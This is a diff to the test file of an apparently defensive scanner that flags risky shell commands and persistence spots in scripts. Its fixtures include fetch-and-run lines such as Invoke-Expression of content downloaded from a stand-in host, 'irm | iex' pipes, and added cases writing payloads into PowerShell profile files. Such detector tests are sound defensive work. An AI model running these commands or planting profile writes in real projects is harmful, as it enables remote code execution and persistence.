@@ -275,6 +275,9 @@ test('a shell script is read whole for its shell commands and the places it name
   ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
   assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\n'), { shell: [1, 3] },
     'its line continued by a backtick, not the next line')
+  assert.deepEqual(found('setup.ps1', 'Set-Content "$HOME\\Documents\\PowerShell\\Profile.ps1" $p\nAdd-Content $PSHOME\\Profile.ps1 $p\n& ./scripts/profile.ps1\n'), { persistence: [1, 2] },
+    'PowerShell\'s all hosts\' profile, not another folder\'s profile.ps1')
+  assert.deepEqual(found('a.js', "appendFileSync(join(homedir(), 'Documents', 'WindowsPowerShell', 'profile.ps1'), p)\n"), { persistence: [1] }, 'and named by its parts')
   assert.equal(found('setup.sh', 'x=\u0060date\u0060 # curl https://x.example/x\n'), null, 'sh\'s backticks no escapes')
   assert.equal(found('bin/setup', '#!/usr/bin/env pwsh\n<# curl https://x.example/install #>\nWrite-Host ok\n'), null, 'PowerShell\'s comments by its hashbang')
   assert.deepEqual(found('install.sh', 'echo "a # curl https://x.example/x" | sh\necho ${#x} curl https://x.example/y\n'), { shell: [1, 2] }, 'a # quoted, or no comment\'s')
